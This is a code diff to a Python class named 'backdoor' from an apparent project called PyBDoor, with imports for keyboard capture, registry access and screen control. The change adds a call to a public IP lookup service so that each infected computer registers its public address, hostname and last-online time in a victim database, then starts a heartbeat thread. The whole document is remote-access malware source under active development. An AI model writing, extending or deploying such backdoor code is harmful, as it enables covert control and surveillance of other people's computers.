@@ -1,4 +1,4 @@
-import sqlite3,socket,os,time,datetime,keyboard,shutil,winreg,pyautogui, threading,pytz
+import sqlite3,socket,os,time,datetime,keyboard,shutil,winreg,pyautogui, threading,pytz, requests
 
 class backdoor:
     def __init__(self):
@@ -13,25 +13,26 @@ class backdoor:
         self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
         self.cursor = self.db.cursor()
 
+        self.ip = requests.get("https://api6.ipify.org", timeout=5).text
         pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
         self.pc_id = None
         for pc in pcs:
-            if socket.gethostbyname(socket.gethostname()) == pc[1]:
+            if self.ip == pc[1]:
                 self.pc_id = pc[0]
 
         if self.pc_id == None:
             sql_code = """INSERT INTO backdoor_computer
-                      (ip_addr, pc_name)
-                      VALUES (?, ?)
+                      (ip_addr, pc_name, last_online)
+                      VALUES (?, ?, ?)
             """
             
-            self.cursor.execute(sql_code, (socket.gethostbyname(socket.gethostname()),socket.gethostname()))
+            self.cursor.execute(sql_code, (self.ip,socket.gethostname(),datetime.datetime.now(pytz.utc)))
             self.db.commit()
 
             pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
             self.pc_id = None
             for pc in pcs:
-                if socket.gethostbyname(socket.gethostname()) == pc[1]:
+                if self.ip == pc[1]:
                     self.pc_id = pc[0]
         t1 = threading.Thread(target=self.ping)
         t1.start()
